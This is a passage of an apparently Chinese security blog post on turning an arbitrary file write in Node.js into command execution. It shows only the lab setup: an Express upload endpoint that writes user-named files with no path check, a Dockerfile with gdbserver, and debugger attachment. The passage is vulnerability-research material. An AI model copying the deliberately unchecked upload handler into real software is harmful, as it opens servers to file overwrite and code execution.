<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="环境搭建本地环境1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798测试环境：">
<meta property="og:type" content="article">
<meta property="og:title" content="nodejs-从任意文件写到命令执行">
<meta property="og:url" content="http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="k0mor3b1">
<meta property="og:description" content="环境搭建本地环境1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798测试环境：">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/k5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/MTc0MDMwMzUyMF9WNA55.png">
<meta property="og:image" content="http://example.com/images/xXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/E3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/A6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/UyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/Tk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/9mXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/yMF9WNA.png">
<meta property="og:image" content="http://example.com/images/data-struct-tool.gif">
<meta property="og:image" content="http://example.com/images/zZLVmN1SmFWbmZkXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/E3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNAa.png">
<meta property="og:image" content="http://example.com/images/E1abnpmXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/bmpnXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png">
<meta property="og:image" content="http://example.com/images/floppy.gif">
<meta property="og:image" content="http://example.com/images/10_utf8_success.webp">
<meta property="og:image" content="http://example.com/images/image.png">
<meta property="og:image" content="http://example.com/images/image-1740300420970.png">
<meta property="og:image" content="http://example.com/images/image-1740300423356.png">
<meta property="og:image" content="http://example.com/images/image-1740300429890.png">
<meta property="og:image" content="http://example.com/images/image-1740300432287.png">
<meta property="og:image" content="http://example.com/images/image-1740300436447.png">
<meta property="og:image" content="http://example.com/images/image-1740300439274.png">
<meta property="article:published_time" content="2024-11-01T00:00:00.000Z">
<meta property="article:modified_time" content="2025-02-23T09:07:23.261Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/MTc0MDMwMzUyMF9WNA.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>nodejs-从任意文件写到命令执行</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/26/2024-08-26-ASUS%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&text=nodejs-从任意文件写到命令执行"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&is_video=false&description=nodejs-从任意文件写到命令执行"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=nodejs-从任意文件写到命令执行&body=Check out this article: http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&name=nodejs-从任意文件写到命令执行&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&t=nodejs-从任意文件写到命令执行"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">本地环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">docker环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置调试环境</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">任意文件写漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-only-file-system"><span class="toc-number">2.2.</span> <span class="toc-text">Read-only file system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Node-js-and-Pipes"><span class="toc-number">2.3.</span> <span class="toc-text">Node.js and Pipes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.4.</span> <span class="toc-text">构建结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2gadget"><span class="toc-number">2.5.</span> <span class="toc-text">搜索gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8B%E6%9C%8D-UTF-8-%E9%99%90%E5%88%B6"><span class="toc-number">2.6.</span> <span class="toc-text">克服 UTF-8 限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        nodejs-从任意文件写到命令执行
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-01T00:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-01</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">测试环境：</span><br><span class="line">    系统：Ubuntu20<span class="number">.04</span></span><br><span class="line">    node v22<span class="number">.11</span><span class="number">.0</span></span><br><span class="line">    </span><br><span class="line">安装nodejs</span><br><span class="line">    <span class="comment"># 更新系统包管理器</span></span><br><span class="line">    sudo apt update</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 移除旧版本的 Node.js</span></span><br><span class="line">    sudo apt remove nodejs</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加 NodeSource 仓库</span></span><br><span class="line">    curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 安装 Node.js v22</span></span><br><span class="line">    sudo apt install -y nodejs</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证是否安装成功</span></span><br><span class="line">    node -v</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果需要更新 npm</span></span><br><span class="line">    sudo npm install -g npm@latest</span><br><span class="line">配置启动nodejs</span><br><span class="line">    <span class="comment"># 创建进入活动目录</span></span><br><span class="line">    mkdir nodejs</span><br><span class="line">    cd nodejs</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建 package.json 文件</span></span><br><span class="line">    npm init -y</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 安装 Express</span></span><br><span class="line">    npm install express</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建上传目录</span></span><br><span class="line">    mkdir uploads</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建 JavaScript 文件</span></span><br><span class="line">    vim index.js</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    const express = require(&#x27;express&#x27;);</span></span><br><span class="line"><span class="string">    const fs = require(&#x27;fs&#x27;);</span></span><br><span class="line"><span class="string">    const path = require(&#x27;path&#x27;);</span></span><br><span class="line"><span class="string">    const app = express();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    app.use(express.json());</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    app.post(&#x27;/upload&#x27;, (req, res) =&gt; &#123;</span></span><br><span class="line"><span class="string">      const &#123; filename, content &#125; = req.body;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">      if (!filename || !content) &#123;</span></span><br><span class="line"><span class="string">        return res.status(400).json(&#123; message: &#x27;Filename and content are required!&#x27; &#125;);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">      const filePath = path.join(__dirname, &#x27;uploads&#x27;, filename);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">      fs.writeFile(filePath, content, (err) =&gt; &#123;</span></span><br><span class="line"><span class="string">        if (err) &#123;</span></span><br><span class="line"><span class="string">          return res.status(500).json(&#123; message: &#x27;Error saving file!&#x27; &#125;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res.json(&#123; message: &#x27;File uploaded successfully!&#x27;, path: filePath &#125;);</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    app.listen(3000, () =&gt; &#123;</span></span><br><span class="line"><span class="string">      console.log(&#x27;Server running on http://localhost:3000&#x27;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 启动node</span></span><br><span class="line">    node index.js</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 测试 API</span></span><br><span class="line">     客户端向 http://localhost:<span class="number">3000</span>/upload 发送 POST 请求来测试文件上传。请求的 JSON 格式应类似于：</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test.txt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;content&quot;</span>: <span class="string">&quot;This is a test file content.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    确保请求头部的 Content-<span class="type">Type</span> 设置为 application/json。如果上传成功，您将收到 JSON 响应，确认文件已成功上传。</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    import requests</span></span><br><span class="line"><span class="string">    import json</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 定义目标 URL</span></span><br><span class="line"><span class="string">    url = &#x27;http://localhost:3000/upload&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 构造数据包</span></span><br><span class="line"><span class="string">    data = &#123;</span></span><br><span class="line"><span class="string">        &quot;filename&quot;: &quot;test.txt&quot;,</span></span><br><span class="line"><span class="string">        &quot;content&quot;: &quot;This is a test file content.&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 发送 POST 请求</span></span><br><span class="line"><span class="string">    response = requests.post(url, json=data)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # 打印响应</span></span><br><span class="line"><span class="string">    print(&quot;Status Code:&quot;, response.status_code)</span></span><br><span class="line"><span class="string">    print(&quot;Response JSON:&quot;, response.json())</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="docker环境"><a href="#docker环境" class="headerlink" title="docker环境"></a><code>docker</code>环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 package.json 文件</span></span><br><span class="line">npm init -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Express</span></span><br><span class="line">npm install express</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Dockerfile</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 使用 Node.js 22.11.0 作为基础镜像</span></span><br><span class="line"><span class="string">FROM node:22.11.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 安装 Python3 环境</span></span><br><span class="line"><span class="string">RUN apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="string">    apt-get install -y python3 &amp;&amp; \</span></span><br><span class="line"><span class="string">    rm -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 拷贝本地的 gdbserver 到容器的 /usr/local/bin 目录</span></span><br><span class="line"><span class="string">COPY gdbserver /usr/local/bin/gdbserver</span></span><br><span class="line"><span class="string">RUN chmod +x /usr/local/bin/gdbserver</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 设置工作目录</span></span><br><span class="line"><span class="string">WORKDIR /app</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 复制 package.json 和 package-lock.json</span></span><br><span class="line"><span class="string">COPY package*.json ./</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 安装 Node.js 依赖</span></span><br><span class="line"><span class="string">RUN npm install</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 复制应用程序的源代码</span></span><br><span class="line"><span class="string">COPY . .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 暴露应用程序的端口</span></span><br><span class="line"><span class="string">EXPOSE 3000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 设置默认入口为 shell</span></span><br><span class="line"><span class="string">CMD [&quot;/bin/bash&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 JavaScript 文件</span></span><br><span class="line">vim index.js</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">const express = require(&#x27;express&#x27;);</span></span><br><span class="line"><span class="string">const fs = require(&#x27;fs&#x27;);</span></span><br><span class="line"><span class="string">const path = require(&#x27;path&#x27;);</span></span><br><span class="line"><span class="string">const app = express();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.use(express.json());</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.post(&#x27;/upload&#x27;, (req, res) =&gt; &#123;</span></span><br><span class="line"><span class="string">  const &#123; filename, content &#125; = req.body;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if (!filename || !content) &#123;</span></span><br><span class="line"><span class="string">    return res.status(400).json(&#123; message: &#x27;Filename and content are required!&#x27; &#125;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  const filePath = path.join(__dirname, &#x27;uploads&#x27;, filename);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fs.writeFile(filePath, content, (err) =&gt; &#123;</span></span><br><span class="line"><span class="string">    if (err) &#123;</span></span><br><span class="line"><span class="string">      return res.status(500).json(&#123; message: &#x27;Error saving file!&#x27; &#125;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    res.json(&#123; message: &#x27;File uploaded successfully!&#x27;, path: filePath &#125;);</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.listen(3000, () =&gt; &#123;</span></span><br><span class="line"><span class="string">  console.log(&#x27;Server running on http://localhost:3000&#x27;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 Docker 镜像</span></span><br><span class="line">docker build -t my-node .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 Docker 容器</span></span><br><span class="line">docker run --privileged -p <span class="number">3000</span>:<span class="number">3000</span> -p <span class="number">1234</span>:<span class="number">1234</span> -v $(pwd)/<span class="number">123</span>:/app/shared -it my-node</span><br></pre></td></tr></table></figure>

<h4 id="配置调试环境"><a href="#配置调试环境" class="headerlink" title="配置调试环境"></a>配置调试环境</h4><p><code>docker</code>容器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@196d69441a97:/app<span class="comment"># node index.js </span></span><br><span class="line">Server running on http://localhost:<span class="number">3000</span></span><br><span class="line"></span><br><span class="line">root@196d69441a97:/app<span class="comment"># ps aux | grep node</span></span><br><span class="line">root          <span class="number">17</span>  <span class="number">0.4</span>  <span class="number">1.4</span> <span class="number">1007156</span> <span class="number">57404</span> pts/<span class="number">0</span>   Sl+  03:04   <span class="number">0</span>:<span class="number">00</span> node index.js</span><br><span class="line">root          <span class="number">26</span>  <span class="number">0.0</span>  <span class="number">0.0</span>   <span class="number">3324</span>  <span class="number">1572</span> pts/<span class="number">1</span>    S+   03:04   <span class="number">0</span>:<span class="number">00</span> grep node</span><br><span class="line">root@196d69441a97:/app<span class="comment"># gdbserver :1234 --attach 17</span></span><br><span 